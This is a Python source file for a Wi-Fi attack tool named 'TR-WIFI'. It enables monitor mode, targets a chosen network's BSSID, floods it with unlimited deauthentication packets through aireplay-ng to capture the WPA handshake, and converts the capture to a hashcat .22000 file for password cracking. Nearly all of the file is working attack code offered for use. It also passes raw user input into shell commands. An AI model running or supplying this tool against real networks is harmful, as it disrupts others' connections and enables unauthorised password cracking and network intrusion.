import os
import sys
import subprocess
import pyfiglet
from colorama import Fore

def banner():
    text = pyfiglet.figlet_format("TR-WIFI")
    print(f"{Fore.CYAN}{text}")
    print(Fore.YELLOW + "Developed by - TRFAHIM" + Fore.RESET)

def home_menu():
    print(f"\n{Fore.LIGHTBLUE_EX}[1] {Fore.WHITE}Monitor Mode")
    print(f"{Fore.LIGHTMAGENTA_EX}[2] {Fore.WHITE}Scan Available Wifi")
    print(f"{Fore.LIGHTYELLOW_EX}[3] {Fore.WHITE}Start Attack")
    print(f"{Fore.GREEN}[4] {Fore.WHITE}Convert Cap File")
    print(f"{Fore.RED}[0] {Fore.WHITE}Exit")

def cl():
    os.system("clear" if os.name == "posix" else "cls")

def back_home():
    b_hm = input(f"{Fore.GREEN}[H] Back Home {Fore.RED}[E] Exit >> {Fore.WHITE}").upper()
    if b_hm == "E":
        sys.exit(0)
    else:
        main()

def check_root():
    return os.geteuid() == 0

def monitor_mode():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "wlan0mon" in result.stdout:
            print(Fore.GREEN + "[+] Monitor mode is already enabled on wlan0mon." + Fore.RESET)
            return

        os.system("ifconfig wlan0 down")
        os.system("iwconfig wlan0 mode monitor")
        os.system("ifconfig wlan0 up")

        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            print(Fore.GREEN + "[+] Monitor mode enabled successfully on wlan0." + Fore.RESET)
        else:
            print(Fore.RED + "[-] Monitor mode is not enabled. Please check your wireless card compatibility or try manually." + Fore.RESET)

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}" + Fore.RESET)

def wifi_scan(interface):
    os.system(f"airodump-ng {interface}")       

def start_airodump(interface, bssid, channel, filename):
    file_save = f"/root/Desktop/{filename}"
    command = f"gnome-terminal -- bash -c 'airodump-ng --channel {channel} --bssid {bssid} --write {file_save} {interface}'"
    subprocess.run(command, shell=True)

def start_aireplay(interface, bssid):
    command = f"gnome-terminal -- bash -c 'aireplay-ng --deauth 0 -a {bssid} {interface}'"
    subprocess.run(command, shell=True)

def convert_cap_to_22000(cap_file, output_file):
    try:
        check_tool = subprocess.run(["which", "hcxpcapngtool"], capture_output=True, text=True)
        if not check_tool.stdout.strip():
            print(Fore.RED + "[-] hcxpcapngtool is not installed. Install it using: sudo apt install hcxtools" + Fore.RESET)
            return
        
        command = f"hcxpcapngtool -o {output_file} {cap_file}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            print(Fore.GREEN + f"[+] Conversion successful! Output file: {output_file}" + Fore.RESET)
        else:
            print(Fore.RED + f"[-] Conversion failed. Error:\n{result.stderr}" + Fore.RESET)

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}" + Fore.RESET)

def main():
    cl()
    banner()

    if not check_root():
        print(Fore.RED + "\n[!] This script must be run as root (use sudo)" + Fore.RESET)
        sys.exit(1)

    home_menu()
    home_input = input(Fore.CYAN + ">>>> " + Fore.WHITE)

    if home_input == "1":
        cl()
        banner()
        monitor_mode()
        back_home()

    elif home_input == "2":
        cl()
        banner()
        interface = input(Fore.LIGHTBLUE_EX + "\nEnter Interface Name [wlan0mon] >>> " + Fore.WHITE)
        print(Fore.RED + "\nSTOP THIS PROCESS (CTRL+C)" + Fore.RESET)
        wifi_scan(interface)
        back_home()

    elif home_input == "3":
        cl()
        banner()
        bssid = input(Fore.LIGHTMAGENTA_EX + "\nEnter Target Wifi BSSID >> " + Fore.WHITE)
        interface = input(Fore.LIGHTBLUE_EX + "Enter Interface Name [wlan0mon] >> " + Fore.WHITE)
        channel = input(Fore.YELLOW + "Enter Channel >> " + Fore.WHITE)
        filename = input(Fore.GREEN + "Enter File Name (without extension) >> " + Fore.WHITE)

        input(Fore.RED + "\nPress Enter when enough packets are captured to start cracking..." + Fore.RESET)
        start_airodump(interface, bssid, channel, filename)
        start_aireplay(interface, bssid)
        back_home()

    elif home_input == "4":
        cl()
        banner()
        cap_file = input(Fore.LIGHTBLUE_EX + "\nEnter the path to your .cap file: " + Fore.WHITE)
        output_file = input(Fore.LIGHTYELLOW_EX + "Enter the output .22000 file path: " + Fore.WHITE)
        
        convert_cap_to_22000(cap_file, output_file)
        back_home()

if __name__ == "__main__":
    main()
